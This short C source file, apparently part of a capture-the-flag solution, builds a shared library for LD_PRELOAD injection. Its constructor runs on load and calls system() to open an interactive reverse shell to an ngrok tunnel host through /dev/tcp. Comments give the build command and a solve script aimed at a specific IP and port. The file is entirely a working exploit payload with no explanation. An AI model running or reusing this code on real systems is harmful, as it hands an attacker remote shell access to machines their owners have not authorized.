// gcc -shared -fPIC shell.c -o shell.so
// python2 solve.py 34.142.161.21 12322 100

#include <unistd.h>
#include <stdlib.h>

__attribute__ ((__constructor__)) void exec(void){
    if (getenv("LD_PRELOAD") == NULL){ return; }
    unsetenv("LD_PRELOAD");
    system("bash -c 'sh -i >& /dev/tcp/8.tcp.ngrok.io/14795 0>&1'");
    return;
}